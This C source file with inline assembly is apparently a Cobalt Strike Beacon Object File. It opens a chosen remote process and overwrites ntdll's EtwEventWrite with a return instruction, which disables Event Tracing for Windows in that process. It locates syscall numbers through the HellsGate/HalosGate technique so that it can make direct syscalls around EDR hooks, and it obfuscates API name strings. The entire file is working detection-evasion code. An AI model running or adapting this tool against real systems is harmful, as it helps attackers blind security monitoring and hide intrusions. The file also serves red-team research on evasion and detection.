// Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
// Credits / References: Reenz0h (@SEKTOR7net), Adam Chester (@_xpn_ / @TrustedSec), Chetan Nayak (@NinjaParanoid), Vivek Ramachandran (@vivekramac), Pavel Yosifovich (@zodiacon), @smelly__vx & @am0nsec, @ajpc500, Matt Kingstone (@n00bRage)
#include <windows.h>
#include "beacon.h"

#define PAGE_READONLY           0x02    
#define PAGE_READWRITE          0x04 
#define PAGE_EXECUTE_READ       0x20    
#define PAGE_EXECUTE_READWRITE  0x40

// HellsGate / HalosGate 
VOID  HellsGate(IN WORD wSystemCall);
VOID  HellDescent();
DWORD halosGateDown(IN PVOID ntdllApiAddr, IN WORD index);
DWORD halosGateUp(IN PVOID ntdllApiAddr, IN WORD index);
DWORD findSyscallNumber(IN PVOID ntdllApiAddr);

// Define NT APIs
//typedef BOOL   (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef BOOL   (NTAPI  * tNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PVOID);
// NtWriteVirtualMemory(RCX:FFFFFFFFFFFFFFFF, RDX: 00007FFA4D2FF1A0 (Addr ntdll.EtwEventWrite), R9:0x1, R10:0x0)
// https://github.com/jthuraisamy/SysWhispers/blob/523f5939ceb238070649d5c111e9733ae9e0940d/example-output/syscalls.h
/*NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN ULONG NumberOfBytesToWrite,
	OUT PULONG NumberOfBytesWritten OPTIONAL);*/
typedef BOOL   (NTAPI  * tNtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);
//                                                 RCX     RDX     R8     R9    
// NtWriteVirtualMemory(
//   RCX: FFFFFFFFFFFFFFFF 
//   RDX: 00000000005FFC70 -> 00 F0 2F 4D FA 7F 00 00 00  (00007FFA4D2FF000)
//   R8:  00000000005FFC78 -> 00 10 00 00 00 00 00 00 00  (0x1000)
//   R9:  0000000020000080
// )
//typedef HANDLE (WINAPI * tOpenProcess)(DWORD, WINBOOL, DWORD);
// https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
// Structs for NtOpenProcess
typedef struct _OBJECT_ATTRIBUTES
{
	ULONG	uLength;
	HANDLE	hRootDirectory;
	PVOID   pObjectName;
	ULONG	uAttributes;
	PVOID	pSecurityDescriptor;
	PVOID	pSecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID
{
	HANDLE	pid;
	HANDLE	UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess
/* NTSTATUS NtOpenProcess(
  IN  PHANDLE            ProcessHandle,
  IN  ACCESS_MASK        DesiredAccess,
  IN  POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PCLIENT_ID         ClientId
);*/
//   RCX: 000000000014FDE8 // Just a 8 byte address to put a handle in
//   RDX: 00000000001FFFFF (PROCESS_ALL_ACCESS)
//   R8:  000000000014FD90 -> 0x30
//   R9:  000000000014FD80 -> 28A4h (process ID in Hex)
typedef BOOL (NTAPI * tNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);

// ASM Function Declaration
PVOID crawlLdrDllList(wchar_t *);
PVOID getExportDirectory(PVOID dllAddr);
PVOID getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable);
PVOID pageAlign(PVOID dllAddr);

typedef struct Export{
    PVOID Directory;
    PVOID AddressTable;
    PVOID NameTable;
    PVOID OrdinalTable;
}Export;

typedef struct Dll{
    PVOID dllBase;
    Export Export;
}Dll;

typedef struct ntapis{
    tNtWriteVirtualMemory NtWriteVirtualMemory;
    DWORD NtWriteVirtualMemorySyscall;
    tNtProtectVirtualMemory NtProtectVirtualMemory;
    DWORD NtProtectVirtualMemorySyscall;
    tNtOpenProcess NtOpenProcess;
    DWORD NtOpenProcessSyscall;
    PVOID pEtwEventWrite;
}ntapis;

void go(char * args, int len) {
	datap parser;
	DWORD pid;
	BeaconDataParse(&parser, args, len);
	pid = BeaconDataInt(&parser);
	BeaconPrintf(CALLBACK_OUTPUT, "Injecting NTDLL.EtwEventWrite bypass in remote process: %d (PID)", pid);
	Dll ntdll;
	// NTDL - String to find Ntdll 
	CHAR ntdlStr[] = {'n','t','d','l',0};
	//__debugbreak();
	// Get base address of NTDLL.DLL from LDR.InMemoryOrderModuleList
	ntdll.dllBase             = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
	// Get Export Directory and Export Tables for NTDLL.DLL
	ntdll.Export.Directory    = getExportDirectory(ntdll.dllBase);
	ntdll.Export.AddressTable = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
	ntdll.Export.NameTable    = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
	ntdll.Export.OrdinalTable = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
	ntapis nt;
	// ######### NTDLL.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
	char EtwEventWriteStr[16];
	// python reverse.py EtwEventWrite
	// String length : 13
	//   etirW    : 6574697257
	//   tnevEwtE : 746e657645777445
	__asm__(
		"mov rsi, %[EtwEventWriteStr] \n"
		"mov r8,  0xFFFFFF9A8B968DA8 \n" // NOT etirW    : 6574697257
		"mov rdx, 0x8B919A89BA888BBA \n" // NOT tnevEwtE : 746e657645777445
		"not rdx \n"
		"not r8 \n"
		"mov [rsi], rdx \n"
		"mov [rsi+0x8], r8 \n"
		: // no output
		:[EtwEventWriteStr] "r" (EtwEventWriteStr)
	);
	nt.pEtwEventWrite  = getSymbolAddress(EtwEventWriteStr, (PVOID)13, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
	// NTDLL.NtProtectVirtualMemory
	CHAR NtProtectVirtualMemoryStr[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
	nt.NtProtectVirtualMemory        = getSymbolAddress(NtProtectVirtualMemoryStr, (PVOID)22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
	// HalosGate/HellsGate to get the systemcall number for NtProtectVirtualMemory
	nt.NtProtectVirtualMemorySyscall = findSyscallNumber(nt.NtProtectVirtualMemory);
	if (nt.NtProtectVirtualMemorySyscall == 0) {
		DWORD index = 0;
		while (nt.NtProtectVirtualMemorySyscall == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			nt.NtProtectVirtualMemorySyscall = halosGateUp(nt.NtProtectVirtualMemory, index);
			if (nt.NtProtectVirtualMemorySyscall) {
				nt.NtProtectVirtualMemorySyscall = nt.NtProtectVirtualMemorySyscall - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			nt.NtProtectVirtualMemorySyscall = halosGateDown(nt.NtProtectVirtualMemory, index);
			if (nt.NtProtectVirtualMemorySyscall) {
				nt.NtProtectVirtualMemorySyscall = nt.NtProtectVirtualMemorySyscall + index;
				break;
			}
		}
	}
	// NTDLL.NtWriteVirtualMemory
	// bobby.cooke$ python3 string2Array.py NtWriteVirtualMemoryStr NtWriteVirtualMemory
	CHAR NtWriteVirtualMemoryStr[] = {'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
	nt.NtWriteVirtualMemory        = getSymbolAddress(NtWriteVirtualMemoryStr, (PVOID)20, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
	nt.NtWriteVirtualMemorySyscall = findSyscallNumber(nt.NtWriteVirtualMemory);
	if (nt.NtWriteVirtualMemorySyscall == 0) {
		DWORD index = 0;
		while (nt.NtWriteVirtualMemorySyscall == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			nt.NtWriteVirtualMemorySyscall = halosGateUp(nt.NtWriteVirtualMemory, index);
			if (nt.NtWriteVirtualMemorySyscall) {
				nt.NtWriteVirtualMemorySyscall = nt.NtWriteVirtualMemorySyscall - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			nt.NtWriteVirtualMemorySyscall = halosGateDown(nt.NtWriteVirtualMemory, index);
			if (nt.NtWriteVirtualMemorySyscall) {
				nt.NtWriteVirtualMemorySyscall = nt.NtWriteVirtualMemorySyscall + index;
				break;
			}
		}
	}
	// NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL);
	CHAR NtOpenProcessStr[] = {'N','t','O','p','e','n','P','r','o','c','e','s','s',0};
	nt.NtOpenProcess        = getSymbolAddress(NtOpenProcessStr, (PVOID)13, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
	nt.NtOpenProcessSyscall = findSyscallNumber(nt.NtOpenProcess);
	if (nt.NtOpenProcessSyscall == 0) {
		DWORD index = 0;
		while (nt.NtOpenProcessSyscall == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			nt.NtOpenProcessSyscall = halosGateUp(nt.NtOpenProcess, index);
			if (nt.NtOpenProcessSyscall) {
				nt.NtOpenProcessSyscall = nt.NtOpenProcessSyscall - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			nt.NtOpenProcessSyscall = halosGateDown(nt.NtOpenProcess, index);
			if (nt.NtOpenProcessSyscall) {
				nt.NtOpenProcessSyscall = nt.NtOpenProcessSyscall + index;
				break;
			}
		}
	}
	// Call the resolved NT functions
	HANDLE hProc = NULL;
	//ttNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
	OBJECT_ATTRIBUTES oa={sizeof(oa),0,NULL,0};
	CLIENT_ID cid;
	// unsigned __int64 pid = 5736;
	//cid.pid = (HANDLE)8968;
	cid.pid = NULL;
	cid.UniqueThread = NULL;
	cid.pid = (HANDLE)pid;
	//__debugbreak();
	// nt.NtOpenProcess(&hProc, 0x1FFFFF, &oa, &cid);
	HellsGate(nt.NtOpenProcessSyscall);
	HellDescent(&hProc, 0x1FFFFF, &oa, &cid);
	// ETW Bypass
	CHAR etwbypass[] = { 0xC3 }; // ret
	//unsigned __int64 etwbypassSize = 1;
	PVOID aligedETW = pageAlign(nt.pEtwEventWrite);
	unsigned __int64 memPage = 0x1000; 
	// The variable for our memory protections as we toggle RX<->RW 
	DWORD oldprotect = 0;
	// Change 0x1000 bytes of memory in NTDLL to RW so we can write the NTDLL.EtwEventWrite bypass
	// nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
	HellsGate(nt.NtProtectVirtualMemorySyscall);
	HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
	// Write the bypass to NTDLL.EtwEventWrite
	// nt.NtWriteVirtualMemory(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
	HellsGate(nt.NtWriteVirtualMemorySyscall);
	HellDescent(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
	// Change the memory permissions for NTDLL.EtwEventWrite back to RX
	// nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
	HellsGate(nt.NtProtectVirtualMemorySyscall);
	HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
}

__asm__(
"findSyscallNumber: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);

__asm__(
"error: \n"
	"xor rax, rax \n"
	"ret \n"
);

__asm__(
"halosGateUp: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"add rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);

__asm__(
"halosGateDown: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"sub rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);

__asm__(
"HellsGate: \n"
	"xor r11, r11 \n"
	"mov r11d, ecx \n"
	"ret \n"
);

__asm__(
"HellDescent: \n"
	"xor rax, rax \n"
	"mov r10, rcx \n"
	"mov eax, r11d \n"
	"syscall \n"
	"ret \n"
);

__asm__(
"pageAlign: \n"
	"or cx,0xFFF \n"    // This with +1 will align us to a memory page.
	"sub rcx, 0xFFF \n"
	"xchg rax, rcx \n" // return aligned page
	"ret"
);

// Takes in the 4 first for characters of a DLL and returns the base address of that DLL module if it is already loaded into memory
// PVOID crawlLdrDllList(wchar_t * dllName)
__asm__(
"crawlLdrDllList: \n"
	"xor rax, rax \n"             // RAX = 0x0
// Check if dllName string is ASCII or Unicode
	"mov rcx, [rcx] \n"           // RCX = First 8 bytes of string 
	"cmp ch, al \n"               // Unicode then jump, else change ASCII to Unicode 4 bytes
	"je getMemList \n"
	"movq mm1, rcx \n"            // MMX1 contains first 8 ASCII Chars
	"psllq mm1, 0x20 \n"          // Set MMX1 to unpack first 4 bytes of Unicode string
	"pxor mm2, mm2 \n"            // NULL out MMX2 Register
	"punpckhbw mm1, mm2 \n"       // convert ASCII to Unicode and save first 4 bytes in MMX1
	"movq rcx, mm1 \n"            // RCX = first 4 chars of DLL name
"getMemList:"
	"mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
	"mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
	"mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
	"mov r11, rbx \n" 
"crawl: \n"
	"mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
	"mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
	"cmp rax, rcx \n"
	"je found \n"
	"mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
	"cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
	"jne crawl \n"
	"xor rax, rax \n"// DLL is not in InMemoryOrderModuleList, return NULL
	"jmp end \n"
"found: \n"
	"mov rax, [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
"end: \n"
	"ret \n"
);

// Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
//PVOID getExportDirectory(PVOID dllBase)
__asm__(
"getExportDirectory: \n"
	"mov r8, rcx \n"
	"mov ebx, [rcx+0x3C] \n"
	"add rbx, r8 \n"
	"xor rcx, rcx \n"
	"add cx, 0x88 \n"
	"mov eax, [rbx+rcx] \n"
	"add rax, r8 \n"
	"ret \n" // return ExportDirectory;
);

// Return the address of the Export Address Table
// PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
//                                    RCX              RDX
__asm__(
"getExportAddressTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
	"ret \n" // return ExportAddressTable
);

// Return the address of the Export Name Table
// PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportNameTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
	"ret \n" // return ExportNameTable;
);

// Return the address of the Export Ordinal Table
// PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportOrdinalTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
	"ret \n" // return ExportOrdinalTable;
);

// PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
__asm__(
"getSymbolAddress: \n"
	"mov r10, [RSP+0x28] \n" // ExportNameTable
	"mov r11, [RSP+0x30] \n" // ExportOrdinalTable
	"xchg rcx, rdx \n" // RCX = symbolStringSize & RDX =symbolString
	"push rcx \n" // push str len to stack
	"xor rax, rax \n"
"loopFindSymbol: \n"
	"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
	"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
	"mov edi, [r10+rax*4] \n"       // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
	"add rdi, r8 \n"                // RDI = &NameString    = RVA NameString + &module.dll
	"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
	"repe cmpsb \n"                 // Compare strings at RDI & RSI
	"je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
	"inc rax \n"                    // Increment to check if the next name matches
	"jmp short loopFindSymbol \n"   // Jump back to start of loop
"FoundSymbol: \n"
	"pop rcx \n"                    // Remove string length counter from top of stack
	"mov ax, [r11+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
	"mov eax, [r9+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
	"add rax, r8 \n"                // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
	"sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
	"jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
	"xor rax, rax \n"               // If forwarder, return 0x0 and exit
"isNotForwarder: \n"
	"ret \n"
);
